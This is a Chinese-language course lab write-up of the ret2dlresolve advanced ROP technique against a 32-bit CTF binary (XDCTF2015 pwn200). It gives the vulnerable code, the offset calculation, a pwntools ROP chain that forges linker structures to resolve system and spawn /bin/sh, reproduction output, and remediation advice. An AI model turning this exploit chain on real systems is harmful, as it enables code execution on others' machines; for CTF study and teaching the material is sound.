# 高级 ROP：ret2dlresolve 复现报告

## 1. 题目选择

本题选择 CTF Wiki 的高级 ROP 方向 `ret2dlresolve`，对应本机题库中的 XDCTF2015 pwn200 32 位 partial RELRO 附件：

```text
/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
```

参考页面：

```text
https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/
```

这道题适合作为课程要求的额外中级或高级 ROP 题，因为它展示了动态链接器重定位流程，而不是简单调用二进制中已经存在的 `system`。

## 2. 程序与漏洞

题目核心代码为：

```c
void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}

int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";
    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

`buf` 只有 100 字节，但 `read` 最多读取 256 字节，因此可以覆盖保存的返回地址。与前面的 ret2libc 题目不同，这个 ELF 没有导入 `system`，程序中也没有 `/bin/sh` 字符串；直接跳转到 `system@plt` 不可行。

漏洞的可利用条件是：

1. 输入长度超过局部数组，能够控制返回地址。
2. `read@plt` 已经存在，可以把第二阶段数据写入 `.bss`。
3. 程序是 partial RELRO，动态链接器的 PLT/GOT 解析机制仍然可用于 ret2dlresolve。
4. ELF 没有 PIE，因此 PLT、`.rel.plt` 和可写段地址固定。

## 3. 防护检查

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro
file main_partial_relro_32
checksec --file=main_partial_relro_32
```

实际结果：

```text
ELF 32-bit LSB executable, Intel 80386
No canary found
NX enabled
No PIE (0x8048000)
Partial RELRO
```

关键段和重定位信息：

```text
.plt       0x08048370
.rel.plt   0x08048324
.got.plt   0x0804a000
.bss       0x0804a028
read@plt   0x08048390
```

可以复核：

```bash
readelf -S main_partial_relro_32 | rg '\.bss|\.got|\.plt|\.rel'
readelf -r main_partial_relro_32
objdump -d -Mintel main_partial_relro_32 | sed -n '/<vuln>:/,/^$/p'
```

## 4. 偏移计算

反汇编显示局部数组地址是 `[ebp-0x6c]`，函数保存的返回地址在 `[ebp+4]`，所以偏移为：

```text
(ebp + 4) - (ebp - 0x6c) = 0x70 = 112
```

也可以使用 cyclic pattern 验证：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616164, n=4))
PY
```

结果为 `112`。因此第一段 ROP 链从 payload 的第 112 字节开始。

## 5. ret2dlresolve 原理

### 5.1 PLT 的正常工作方式

对于动态链接函数，第一次调用某个 `foo@plt` 时，PLT 会把重定位索引交给动态链接器。动态链接器根据：

```text
.rel.plt 中的 Elf32_Rel
.dynsym 中的 Elf32_Sym
.dynstr 中的函数名字符串
```

找到真实函数地址，写入 GOT，之后再跳转执行。

本题没有 `system` 的动态符号，因此不能直接使用现有 PLT 项。ret2dlresolve 的做法是把伪造的 `Elf32_Rel`、`Elf32_Sym` 和字符串 `"system"` 放进可写内存，然后调用 PLT0，并传入伪造重定位项的索引。动态链接器会把这条伪造记录当成正常重定位，解析出 libc 中的 `system`。

### 5.2 为什么可以写入 `.bss`

`.bss` 位于可写段，当前题目的 `.bss` 起始地址是 `0x0804a028`。pwntools 为了满足对齐和布局要求，选择：

```text
dlresolve.data_addr = 0x0804ae00
```

该位置保存伪造重定位项、伪造符号项、字符串表内容以及参数字符串 `/bin/sh`。

## 6. ROP 链构造

脚本使用 pwntools 的 `Ret2dlresolvePayload` 生成伪造数据：

```python
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"],
)
```

随后构造两部分 ROP：

```python
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
```

第一条让程序调用：

```text
read(0, 0x0804ae00, 44)
```

把伪造的动态链接数据写到 `.bss`。第二条负责：

1. 跳到 PLT0。
2. 传入伪造重定位项的索引。
3. 让动态链接器解析 `system`。
4. 把 `/bin/sh` 作为参数传给解析出的 `system`。

本机 pwntools 生成的链可概括为：

```text
0x08048390       read(0, 0x0804ae00)
0x0804864a       调整栈并继续 ROP
0x08048370       PLT0
0x00002af8       伪造重定位索引
0x0804ae24       参数：/bin/sh
```

其中中间的栈调整 gadget 用于满足 32 位调用约定和 pwntools 生成的链布局，具体值由 ELF gadget 自动计算。

## 7. 两次 read 与 payload 布局

程序第一次 `read(0, buf, 256)` 只读取 payload 的前 256 字节。ROP 链执行后会再次调用 `read`，把剩余的 `dlresolve.payload` 读到 `0x0804ae00`。

因此最终发送的数据布局是：

```text
偏移 0x00       填充
偏移 0x70       ROP 链（112 字节之后）
偏移 0x100      伪造 Elf32_Rel / Elf32_Sym / 字符串数据
```

脚本用 `flat` 明确指定两个位置：

```python
payload = flat({
    112: rop.chain(),
    256: dlresolve.payload,
})
```

一次 `sendline` 会被第一次 `read` 和 ROP 中的第二次 `read` 分别消耗，因此不需要额外的交互阶段。

## 8. 复现步骤

```bash
cd /home/xyx/Desktop/ret2dlresolve_repro
python3 exploit.py
```

进入 shell 后输入：

```text
echo RET2DL_OK
```

成功输出：

```text
RET2DL_OK
```

也可以直接运行题库自带脚本：

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro
printf 'echo RET2DL_OK\n' | python3 exp-pwntools.py
```

本机实测结果：

```text
Starting local process './main_partial_relro_32'
RET2DL_OK
```

## 9. 与普通 ret2libc 的比较

普通 ret2libc 需要已知或泄露 libc 地址，并且通常需要程序导入 `system` 或者通过 libc 符号计算它。ret2dlresolve 不依赖目标程序已经导入 `system`，而是主动构造动态链接器所需的数据结构，让运行时解析器完成函数解析。

这也解释了本题为什么需要 partial RELRO：动态链接相关数据仍然处于可利用的状态。开启 full RELRO 后，GOT 和相关重定位区域会在启动时完成绑定并设为只读，传统 ret2dlresolve 路径会受到限制。

## 10. 防护与修复

漏洞根源是 `read` 的长度参数大于栈缓冲区大小，应把读取长度限制为 `sizeof(buf)`，例如：

```c
read(0, buf, sizeof(buf) - 1);
```

同时应启用栈 canary、PIE、full RELRO 和 NX。NX 只能阻止直接执行注入代码，不能单独防止 ROP；canary 和正确的边界检查才可以阻断本题的返回地址覆盖。

## 11. 结论

本题完成了从栈溢出到动态解析的完整链路：先覆盖返回地址，再利用程序已有的 `read` 把伪造解析数据写入 `.bss`，最后调用 PLT0 触发动态链接器解析 `system` 并执行 `/bin/sh`。它体现了高级 ROP 中“复用动态链接机制”的思路，适合作为课程要求的额外 CTF Wiki 高级 ROP 实验。
